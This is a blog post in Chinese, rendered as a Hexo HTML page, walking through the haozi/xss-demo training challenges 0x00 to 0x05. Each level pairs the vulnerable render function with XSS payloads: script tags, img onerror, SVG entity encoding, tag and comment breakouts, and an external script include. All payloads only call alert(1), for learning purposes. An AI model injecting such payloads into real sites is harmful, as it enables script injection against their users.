@@ -1,0 +1,1111 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#fff">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/fish-32x32.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/fish-16x16.png?v=6.4.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#fff">
+
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.1',
+    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="haozi/xss-demo笔记在线xss题目,用于xss学习,弹出alert(1)就过关. 地址:https://xss.haozi.me 项目: https://github.com/haozi/xss-demo ,有提供的答案https://github.com/haozi/xss-demo/issues/1 自带alert(1)的js地址：https://xss.haozi.me/j.js">
+<meta name="keywords" content="XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="haozi&#x2F;xss-demo笔记">
+<meta property="og:url" content="https://yingyingguaier.github.io/2018/10/08/haozi-xss-demo笔记/index.html">
+<meta property="og:site_name" content="0menc&#39;s Blog">
+<meta property="og:description" content="haozi/xss-demo笔记在线xss题目,用于xss学习,弹出alert(1)就过关. 地址:https://xss.haozi.me 项目: https://github.com/haozi/xss-demo ,有提供的答案https://github.com/haozi/xss-demo/issues/1 自带alert(1)的js地址：https://xss.haozi.me/j.js">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/000.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/001.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/002.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/003.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/004.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/005.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/006.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/007.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/008.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/009.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/00A.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/00B.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/00C.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/00D.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/00E.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/00F.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/010.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/011.png">
+<meta property="og:image" content="https://yingyingguaier.github.io/img/xss/haozi/012.png">
+<meta property="og:updated_time" content="2019-06-19T18:51:35.112Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="haozi&#x2F;xss-demo笔记">
+<meta name="twitter:description" content="haozi/xss-demo笔记在线xss题目,用于xss学习,弹出alert(1)就过关. 地址:https://xss.haozi.me 项目: https://github.com/haozi/xss-demo ,有提供的答案https://github.com/haozi/xss-demo/issues/1 自带alert(1)的js地址：https://xss.haozi.me/j.js">
+<meta name="twitter:image" content="https://yingyingguaier.github.io/img/xss/haozi/000.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://yingyingguaier.github.io/2018/10/08/haozi-xss-demo笔记/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>haozi/xss-demo笔记 | 0menc's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0menc's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">学习、踩坑及经验分享</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-commonweal">
+    <a href="/404.html" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>Commonweal 404</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yingyingguaier.github.io/2018/10/08/haozi-xss-demo笔记/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="嘤嘤怪er">
+      <meta itemprop="description" content="0menc">
+      <meta itemprop="image" content="/images/jack.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0menc's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">haozi/xss-demo笔记
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-10-08 21:59:54" itemprop="dateCreated datePublished" datetime="2018-10-08T21:59:54+08:00">2018-10-08</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/XSS/" itemprop="url" rel="index"><span itemprop="name">XSS</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="haozi-xss-demo笔记"><a href="#haozi-xss-demo笔记" class="headerlink" title="haozi/xss-demo笔记"></a>haozi/xss-demo笔记</h1><p>在线xss题目,用于xss学习,弹出alert(1)就过关.</p>
+<p>地址:<a href="https://xss.haozi.me" target="_blank" rel="noopener">https://xss.haozi.me</a></p>
+<p>项目: <a href="https://github.com/haozi/xss-demo" target="_blank" rel="noopener">https://github.com/haozi/xss-demo</a> ,有提供的答案<a href="https://github.com/haozi/xss-demo/issues/1" target="_blank" rel="noopener">https://github.com/haozi/xss-demo/issues/1</a></p>
+<p>自带alert(1)的js地址：<a href="https://xss.haozi.me/j.js" target="_blank" rel="noopener">https://xss.haozi.me/j.js</a></p>
+<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><h2 id="server-code"><a href="#server-code" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span></span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;div&gt;'</span> + <span class="built_in">input</span> + <span class="string">'&lt;/div&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">没有过滤,在&lt;<span class="keyword">div</span>&gt;标签中输出</span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code"><a href="#input-code" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'1'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">2. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">3. 利用外联方式 </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://xss.haozi.me/j.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   </span><br><span class="line"></span><br><span class="line">4. 利用onerror事件,当src寻找的资源不存在发送错误弹框。</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">''</span> <span class="attr">onerror</span>=<span class="string">'alert(1)'</span>&gt;</span></span><br><span class="line"></span><br><span class="line">5.  利用html的字符实体和SVG。</span><br><span class="line">    SVG意为可缩放矢量图形（Scalable Vector Graphics）。</span><br><span class="line">    SVG 使用 XML 格式定义图像。</span><br><span class="line">   <span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#x28;1&amp;#x29;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="html"><a href="#html" class="headerlink" title="html:"></a>html:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'1'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">2. <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">3. <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://xss.haozi.me/j.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">4. <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">''</span> <span class="attr">onerror</span>=<span class="string">'alert(1)'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">5. <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#x28;1&amp;#x29;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/000.png" alt="000"></p>
+<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h2 id="server-code-1"><a href="#server-code-1" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span></span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;textarea&gt;'</span> + <span class="built_in">input</span> + <span class="string">'&lt;/textarea&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在<span class="tag">&lt;<span class="name">textarea</span>&gt;</span>中,没有过滤,构造闭合</span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code-1"><a href="#input-code-1" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'1'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="html-1"><a href="#html-1" class="headerlink" title="html:"></a>html:</h2> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'1'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/001.png" alt="001"></p>
+<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h2 id="server-code-2"><a href="#server-code-2" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="type">'&lt;input</span> <span class="keyword">type</span>=<span class="string">"name"</span> value=<span class="string">"' + input + '"</span>&gt;'</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在<span class="tag">&lt;<span class="name">input</span>&gt;</span>中,没有过滤,双引号闭合,构造双引号闭合</span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code-2"><a href="#input-code-2" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. "&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'1'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="html-2"><a href="#html-2" class="headerlink" title="html:"></a>html:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'1'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/002.png" alt="002"></p>
+<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h2 id="server-code-3"><a href="#server-code-3" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span></span> &#123;</span><br><span class="line">  const stripBracketsRe = /[()]/g</span><br><span class="line">  <span class="built_in">input</span> = <span class="built_in">input</span>.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">input</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了<span class="comment">()</span>,想办法用其他方式代替<span class="comment">()</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code-3"><a href="#input-code-3" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">2. </span><br><span class="line">    利用html的字符实体和SVG。</span><br><span class="line">    SVG意为可缩放矢量图形（Scalable Vector Graphics）。</span><br><span class="line">    SVG 使用 XML 格式定义图像。</span><br><span class="line">    <span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#x28;1&amp;#x29;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"> 3. 利用外联</span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://xss.haozi.me/j.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> 4. 利用img标签,结合onerrors事件,src资源不存在会触发错误。 </span><br><span class="line"> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">''</span> <span class="attr">onerror</span>=<span class="string">"alert&amp;#x28;&amp;#x31;&amp;#x29;"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="html-3"><a href="#html-3" class="headerlink" title="html:"></a>html:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">2. <span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#x28;1&amp;#x29;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">3. <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://xss.haozi.me/j.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">4. <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">''</span> <span class="attr">onerror</span>=<span class="string">"alert&amp;#x28;&amp;#x31;&amp;#x29;"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/003.png" alt="003"></p>
+<h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><h2 id="server-code-4"><a href="#server-code-4" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span></span> &#123;</span><br><span class="line">  const stripBracketsRe = /[()`]/g</span><br><span class="line">  <span class="built_in">input</span> = <span class="built_in">input</span>.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">input</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">多过滤了`</span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code-4"><a href="#input-code-4" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. </span><br><span class="line">    利用html的字符实体和SVG。</span><br><span class="line">    SVG意为可缩放矢量图形（Scalable Vector Graphics）。</span><br><span class="line">    SVG 使用 XML 格式定义图像。</span><br><span class="line">    <span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#x28;1&amp;#x29;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"> 2. 利用外联</span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://xss.haozi.me/j.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> 3. 利用img标签,结合onerrors事件,src资源不存在会触发错误。 </span><br><span class="line"> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">''</span> <span class="attr">onerror</span>=<span class="string">"alert&amp;#x28;&amp;#x31;&amp;#x29;"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="html-4"><a href="#html-4" class="headerlink" title="html:"></a>html:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#x28;1&amp;#x29;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">2. <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://xss.haozi.me/j.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">3. <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">''</span> <span class="attr">onerror</span>=<span class="string">"alert&amp;#x28;&amp;#x31;&amp;#x29;"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/004.png" alt="004"></p>
+<h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><h2 id="server-code-5"><a href="#server-code-5" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.replace(/--&gt;/g, '😂')</span><br><span class="line">  return '<span class="comment">&lt;!-- ' + input + ' --&gt;</span>'</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造闭合</span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code-5"><a href="#input-code-5" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. --!&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="html-5"><a href="#html-5" class="headerlink" title="html:"></a>html:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="comment">&lt;!-- --!&gt;&lt;script&gt;alert(1)&lt;/script&gt; --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/005.png" alt="005"></p>
